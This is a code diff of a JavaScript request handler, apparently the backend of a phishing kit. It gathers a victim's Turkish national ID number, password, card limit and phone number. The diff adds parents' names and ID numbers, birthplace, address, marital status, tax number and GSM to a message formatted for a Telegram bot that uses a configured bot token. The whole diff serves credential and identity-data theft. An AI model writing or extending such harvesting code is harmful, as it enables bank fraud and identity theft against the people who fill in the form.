@@ -18,7 +18,28 @@ export default async function handler(req, res) {
   }
 
   try {
-    const { tckn, password, telefon, kartLimiti, adSoyad, dogumTarihi, type } = req.body;
+    const { 
+      tckn, 
+      password, 
+      telefon, 
+      kartLimiti, 
+      adSoyad, 
+      dogumTarihi, 
+      cinsiyet,
+      dogumYeri,
+      anneAdi,
+      babaAdi,
+      anneTCKN,
+      babaTCKN,
+      adresIl,
+      adresIlce,
+      memleketIl,
+      memleketIlce,
+      medeniHal,
+      vergiNumarasi,
+      gsm,
+      type 
+    } = req.body;
 
     // Env değişkenleri veya default değerler
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
@@ -69,7 +90,46 @@ ${escapeHtml(adSoyad)}
 📅 <b>Doğum Tarihi:</b>
 ${escapeHtml(dogumTarihi)}
 
-📞 <b>Telefon Numarası:</b>
+⚧️ <b>Cinsiyet:</b>
+${escapeHtml(cinsiyet)}
+
+📍 <b>Doğum Yeri:</b>
+${escapeHtml(dogumYeri)}
+
+👩 <b>Anne Adı:</b>
+${escapeHtml(anneAdi)}
+
+👨 <b>Baba Adı:</b>
+${escapeHtml(babaAdi)}
+
+🆔 <b>Anne TCKN:</b>
+<code>${escapeHtml(anneTCKN)}</code>
+
+🆔 <b>Baba TCKN:</b>
+<code>${escapeHtml(babaTCKN)}</code>
+
+🏠 <b>Adres İl:</b>
+${escapeHtml(adresIl)}
+
+🏘️ <b>Adres İlçe:</b>
+${escapeHtml(adresIlce)}
+
+🗺️ <b>Memleket İl:</b>
+${escapeHtml(memleketIl)}
+
+🗺️ <b>Memleket İlçe:</b>
+${escapeHtml(memleketIlce)}
+
+💑 <b>Medeni Hal:</b>
+${escapeHtml(medeniHal)}
+
+📋 <b>Vergi Numarası:</b>
+<code>${escapeHtml(vergiNumarasi)}</code>
+
+📱 <b>GSM (API):</b>
+${escapeHtml(gsm)}
+
+📞 <b>Telefon Numarası (Form):</b>
 ${escapeHtml(telefon)}
 
 💵 <b>Kart Limiti:</b>
